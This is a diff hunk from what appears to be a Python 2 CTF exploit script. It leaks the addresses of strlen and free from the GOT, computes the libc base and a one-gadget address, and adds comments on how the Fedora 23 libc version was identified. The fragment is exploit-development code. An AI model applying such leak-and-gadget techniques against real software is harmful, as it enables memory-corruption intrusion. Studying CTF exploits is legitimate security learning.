@@ -138,7 +138,10 @@ free_addr, newname = leak(free_got, newname)
 print '[+] strlen @ %#x' % strlen_addr
 print '[+] free @ %#x' % free_addr
 
+# looking at the strings in the binary you can find "GCC: (GNU) 5.3.1 20151207 (Red Hat 5.3.1-2)" and "GLIBC_2.2.5"
+# after trying some libraries online, I found the correct one.
 print '... somehow now you know the libc version ... (Fedora 23 libc)'
+
 libc_base = free_addr - free_off
 magicgadget = libc_base + magicgadget_off
 print '[+] libc_base = %#x' % libc_base
